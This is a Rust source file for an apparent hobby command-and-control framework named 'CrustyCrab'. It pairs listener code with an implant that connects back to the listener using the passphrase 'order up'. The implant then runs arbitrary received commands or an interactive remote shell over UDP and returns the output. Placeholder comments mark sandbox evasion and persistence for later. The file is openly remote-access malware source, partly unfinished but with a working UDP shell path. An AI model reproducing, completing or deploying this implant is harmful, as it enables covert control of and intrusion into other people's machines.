/* CRUSTY CRAB API
 * Authors: Robert Heine, Alexander Schmith, Chandler Hake
 * Source: https://github.com/AlexSchmith/CrustyCrab
 */

use std::process::Command;
use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
use std::io::{Read, Write};
use std::format;
use std::ptr::null;
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::thread;
use std::path::Path;

/*****************************/
/*     USEFUL STRUCTURES     */
/*****************************/

pub struct SystemInfo {
    arch: String,
    os: String,
    hostname: String,
}

pub struct Listener {
    pub udp_sock: Option<UdpSocket>,
    pub tcp_sock: Option<TcpListener>,
    pub id: u64,
    // 0 for idle, 1 for listening, 2 for connected
    pub status: u8,
}

pub fn new_lsn(i: u64) -> Listener {
    let ret = Listener {
        udp_sock: None,
        tcp_sock: None,
        id: i,
        status: 0,
    };
    return ret;
}

pub struct SharedBuffer {
    pub cc: u8,
    pub buff: Vec<u8>,
}

pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    match protocol {
        "udp" => listen_udp(lsn, address, sb),
        "tcp" => listen_tcp(lsn, address, sb),
        "http" => listen_tcp(lsn, address, sb),
        "dns" => listen_udp(lsn, address, sb),
        &_ => todo!(),
    }
}

/****************************/
/*     LISTENER METHODS     */
/****************************/

// listens using a TcpListener
fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    lsn.status = 1;
    lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
    println!("[+] Opening tcp listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 {
            break;
        }

        let acpt = lsn.tcp_sock.as_ref().expect("tcp listener not initialized").accept();
        match acpt {
            Ok((mut stream, _address)) => {
                let mut buffer = [0; 2048];
                let bytes = stream.read(&mut buffer[..]).unwrap();

                // replace insides of .contains() with whatever string/key we are using to verify connection
                if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                    lsn.status = 2;
                    // switches to interact mode
                    interact_tcp(lsn, &mut stream, sb);
                    lsn.status = 1;
                }
                stream.shutdown(Shutdown::Both).expect("shutdown call failed");
            }
            Err(e) => { /* Connection failed, nothing to do here. */ }
        }
    }
    lsn.status = 0;
}

// listens using a UdpSocket
fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>){
    // Setup socket to listen for implant connection
    lsn.status = 1;
    lsn.udp_sock = Some(UdpSocket::bind(address).expect("Couldnt bind address"));
    lsn.udp_sock.as_ref().expect("udp socket not initialized").set_read_timeout(Some(Duration::from_millis(5))).expect("set_read_timeout failed");
    println!("[+] Opening udp listener on port {}", address.port());
    loop {
        // Checks for commands from the client each iteration
        let cmd: u8 = rcv_client_command(lsn, sb);
        if cmd == 2 {
            break;
        }

        let mut buffer = [0; 2048];
        let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };

        // replace insides of .contains() with whatever string/key we are using to verify connection
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
            lsn.status = 2;
            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to("order recieved".as_bytes(), src);
            // switches to interact mode
            interact_udp(lsn, src, sb);
            lsn.status = 1;
        }
    }
    lsn.status = 0;
}

// handles interaction with the implant
// acts as a middleman between the implant and client
fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("[+] Connection established by listener {}", lsn.id);
    let mut is_interacting: bool = false;
    loop {
        // live interaction with the implant
        if is_interacting {
            // checks if client is terminating interaction with target_src
            let cc: u8 = rcv_client_command(lsn, sb);
            if cc == 6 {
                is_interacting = false;
                let code: u8 = 69;
                lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
            }
            // otherwise interact normally
            else {
                let mut sb_copy = sb.lock().unwrap();
                if !vec_is_zero(&sb_copy.buff) {
                    // send null byte to indicate no change in cc
                    let code: u8 = 0;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    // now send input
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                    let mut output = [0; 2048];
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
                    sb_copy.buff = output.to_vec();
                }
            }
        }
        else {
            // check for client commands
            let cc: u8 = rcv_client_command(lsn, sb);
            match cc {
                // go back to listening mode
                3 => {
                    // tell the implant to go dormant
                    let code: u8 = 69;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                    return;
                },
                // send a single line command to the implant to execute
                4 => {
                    let mut flag: bool = true;
                    while flag {
                        let mut sb_copy = sb.lock().unwrap();
                        if !vec_is_zero(&sb_copy.buff) {
                            let code: u8 = 1;
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                            let mut output = [0; 2048];
                            lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output);
                            sb_copy.buff = output.to_vec();
                            flag = false;
                        }
                        else {
                            thread::sleep(Duration::from_millis(10));
                        }
                    }
                },
                // tell implant to create a shell and begin interacting with it
                5 => {
                    is_interacting = true;
                    let code: u8 = 2;
                    lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&[code; 1], target);
                },
                _u8 => todo!(),
            }
        }
    }
}

fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<SharedBuffer>>) {
    println!("[+] Connection established by listener {}", lsn.id);
    // TODO
}

// recieves a single byte from the client: the command code
// this command code, represented as an integer, determines
// what the client wants the listener to do
// anything not explicitly listed below => no command recieved, do nothing
// 1 => send all information about the listener
// 2 => stop listening
// 3 => terminate anchovy connection
// 4 => prepare to send_cmd to an anchovy
// 5 => begin shell on anchovy
// 6 => terminate shell on anchovy
fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> u8 {
    let mut sb_ref = sb.lock().unwrap();
    // only action needed to be taken inside this function is to send back listener info
    if sb_ref.cc == 1 {
        let mut lsn_info = get_lsn_info(lsn);
        // TODO: send lsn_info back to client
    }
    // just for testing
    let cc = sb_ref.cc;
    //let confirm = format!("Control Code Recieved: {cc}");
    //sb_ref.buff = confirm.as_bytes().to_vec();
    return cc;
}

// Returns a string containing the full info of a given listener
pub fn get_lsn_info(lsn: &mut Listener) -> String {
    let mut stat: &str;
    match lsn.status {
        0 => stat = "Idle",
        1 => stat = "Listening",
        2 => stat = "Bound",
        _u8 => todo!(),
    }
    let id: u64 = lsn.id;
    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
    return lsn_info;
}

/*****************************************/
/*     ENCRYPTION/DECRYPTION METHODS     */
/*****************************************/

// Boiler function for encoding our commands into a dns packet
pub fn encode_dns(){

}

// Boiler function for encoding our commands into a http packet
pub fn encode_http(){

}


// Boiler function for decoding a dns packet for our code to read
pub fn decode_dns(){

}

// Boiler function for decoding an http packet into our own protocol
pub fn decode_http(){

}

/***************************/
/*     IMPLANT METHODS     */
/***************************/

// creates a shell on the target
pub fn shell(sock: &mut UdpSocket) {
    println!("Shell Started!");
    loop {
        // checks if shell is being terminated
        let mut cc = [0; 1];
        let (bytes, src) = match sock.recv_from(&mut cc) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if cc[0] == 69 {
            break;
        }
        // Otherwise shell it up!
        let mut buffer = [0;2048];
        let (bytes, src) = match sock.recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        //Changed to include 1 because there was a bunch 
        //being sent that didnt have anything
        if bytes != 0 && bytes != 1{
            let mut cmd = String::from_utf8_lossy(&buffer[..]).to_string();
            let cmd_out = format!("{}{}", execute_cmd(cmd), "\n>> ");
            sock.send_to(cmd_out.as_bytes(), src);
            
            
        }
    }
}

// executes a single arbitrary command
pub fn execute_cmd(s: String) -> String {
    if s.trim().contains(' ') {
        let mut split = s.trim().split_whitespace();
        let head = split.next().unwrap();
        let tail = split;
        match head {
            "cd" => {
                let new_dir = tail.peekable().peek().map_or("/", |x| *x);
                let root = Path::new(new_dir);
                match std::env::set_current_dir(&root) {
                    Err(e) => return format!("{}", e),
                    Ok(k) => todo!(),
                }
            },
            "nul" => {
                return head.to_string();
            }
            head => {
                //Printing for testing purposes
                println!("{:?}", head);
                let cmd = Command::new(head).args(tail).output();
                match cmd{
                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
                    Err(e) => return format!("{}", e),
                }
            },
        }
    }
    else {
        //Trim initial string
        let mut tmp = s.trim();
        //Trim all null bytes
        tmp = tmp.trim_matches('\0');
        //Trim remaining whitespace
        tmp = tmp.trim();

        match tmp {
            "exit" => return String::new(),
            tmp => {
                let cmd = Command::new(tmp).output();
                match cmd {
                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
                    Err(e) => return format!("{}", e),
                }
            }
        }
    }
}

// main method for implants
// dispatches to other methods based on network protocol
pub fn imp_run(protocol: &str, address: SocketAddr) {
    match protocol {
        "udp" => imp_udp(address),
        "tcp" => imp_tcp(address),
        &_ => todo!(),
    }
}

// main for a udp implant
fn imp_udp(lsn_addr: SocketAddr) {
    // sandbox evasion

    // persistence

    // get public facing IP and pick a port, then initialize socket
    // for sake of demos, stick to localhost
    let address = SocketAddr::from(([127, 0, 0, 1], 2973));
    // let address = get_system_addr();
    let mut sock = UdpSocket::bind(address).unwrap();
    sock.set_read_timeout(Some(Duration::from_millis(100))).expect("set_read_timeout failed");

    // try to connect back to listener
    sock.send_to("order up".as_bytes(), lsn_addr);
    let mut buffer = [0; 2048];
    let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
    loop {
        (bytes, src) = match sock.recv_from(&mut buffer) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order recieved") {
            break;
        }
    }

    println!("Connected");

    // once connected, listen for control code in a loop and use a match to determine what to do
    loop {
        let mut cc = [0; 1];
        let (bytes, src) = match sock.recv_from(&mut cc) {
            Ok((b, s)) => (b, s),
            Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
        };
        if bytes != 0 {
            match cc[0] {
                // execute single line cmd
                1 => {
                    buffer = [0; 2048];
                    let (bytes, src) = match sock.recv_from(&mut buffer) {
                        Ok((b, s)) => (b, s),
                        Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                    };
                    if bytes != 0 {
                        let cmd_res: String = execute_cmd(String::from_utf8_lossy(&buffer[..]).as_ref().to_string());
                    }
                },
                // begin shell mode
                2 => shell(&mut sock),
                _u8 => todo!(),
            }
        }
    }
}

// main for a tcp implant
fn imp_tcp(address: SocketAddr) {

}


/*******************************/
/*     MISC HELPER METHODS     */
/*******************************/

// returns true if the vector is all zero
pub fn vec_is_zero(buffer: &Vec<u8>) -> bool {
    for byte in buffer.into_iter() {
        if *byte != 0 {
            return false;
        }
    }
    return true;
}

// returns a SocketAddr containing the public facing IP of the machine and a random unused port
pub fn get_system_addr() -> SocketAddr {
    // replace this with code to find system address
    return SocketAddr::from(([127, 0, 0, 1], 1337));
}
